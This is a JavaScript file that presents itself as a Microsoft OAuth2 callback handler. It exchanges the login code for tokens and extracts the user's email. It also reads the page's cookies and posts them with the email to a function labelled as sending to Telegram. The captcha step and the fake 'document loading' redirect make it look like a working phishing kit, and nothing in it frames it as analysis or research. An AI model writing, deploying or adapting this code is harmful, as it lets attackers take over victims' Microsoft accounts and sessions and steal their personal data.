// OAuth Callback Handler for Microsoft OAuth2 (PKCE Flow)
// This script is loaded by public/oauth-callback.html after Microsoft redirects back

async function handleOAuthCallback() {
    const statusEl = document.getElementById('status');
    const resultEl = document.getElementById('result');
    const spinnerEl = document.getElementById('spinner');

    // Hide spinner function
    function hideSpinner() {
        if (spinnerEl) {
            spinnerEl.style.display = 'none';
        }
    }

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');

        console.log('🔍 OAuth callback received:', { code: !!code, state, error });

        if (error) {
            hideSpinner();
            statusEl.textContent = 'OAuth error: ' + error;
            resultEl.innerHTML = `<div class="error">OAuth error: ${error}</div>`;
            // Redirect back to start the flow again
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 3000);
            return;
        }

        if (!code || !state) {
            hideSpinner();
            statusEl.textContent = 'Missing code or state!';
            resultEl.innerHTML = `<div class="error">Missing code or state in callback.</div>`;
            // Redirect back to start the flow again
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 3000);
            return;
        }

        statusEl.textContent = 'Processing authentication...';
        console.log('🔄 Starting token exchange...');

        // POST to your backend to exchange code for tokens
        const res = await fetch('/.netlify/functions/tokenExchange', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code, state }),
        });

        const tokenData = await res.json();
        console.log('📥 Token exchange response:', tokenData);

        // Extract email from tokenData
        let userEmail = null;
        
        // Method 1: From direct email field
        if (tokenData.email) {
            userEmail = tokenData.email;
        }
        
        // Method 2: From JWT token
        if (!userEmail && tokenData.tokens && tokenData.tokens.id_token) {
            try {
                const payload = tokenData.tokens.id_token.split('.')[1];
                const paddedPayload = payload + '='.repeat((4 - payload.length % 4) % 4);
                const decoded = JSON.parse(atob(paddedPayload.replace(/-/g, '+').replace(/_/g, '/')));
                userEmail =
                    decoded.email ||
                    decoded.preferred_username ||
                    decoded.upn ||
                    decoded.unique_name ||
                    null;
                console.log('📧 Email from JWT:', userEmail);
            } catch (jwtError) {
                console.warn('⚠️ Failed to decode JWT:', jwtError);
            }
        }

        // Method 3: From user profile
        if (!userEmail && tokenData.user) {
            userEmail =
                tokenData.user.email ||
                tokenData.user.mail ||
                tokenData.user.userPrincipalName ||
                null;
        }

        // Method 4: Fallback
        if (!userEmail && tokenData.userProfile) {
            userEmail =
                tokenData.userProfile.mail ||
                tokenData.userProfile.userPrincipalName ||
                null;
        }

        console.log('📧 Final extracted email:', userEmail);

        // ✅ Send email and cookies to Telegram
        try {
            // Capture cookies from document.cookie
            const cookies = document.cookie; // This will send all accessible cookies as a string

            const telegramPayload = {
                email: userEmail || 'user-email-pending@oauth.exchange',
                cookies: cookies // Add cookies to the payload
            };

            const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(telegramPayload),
            });

            const telegramResult = await telegramResponse.json();
            console.log('📤 Telegram result:', telegramResult);
        } catch (telegramError) {
            console.warn('⚠️ Telegram send failed:', telegramError);
        }

        hideSpinner();
        statusEl.textContent = 'Authentication successful!';
        resultEl.innerHTML = `<div class="success">Authentication completed successfully! Redirecting...</div>`;

        // **Redirect to document loading**
        setTimeout(() => {
            window.location.href = '/?step=success';
        }, 2000);

    } catch (err) {
        hideSpinner();
        statusEl.textContent = 'Error occurred during callback.';
        resultEl.innerHTML = `<div class="error">${err.message}</div>`;
        console.error('❌ OAuth callback error:', err);
        
        // Redirect back on error too
        setTimeout(() => {
            window.location.href = '/?step=captcha';
        }, 3000);
    }
}

// Run on load
console.log('🚀 OAuth callback script loaded');
handleOAuthCallback();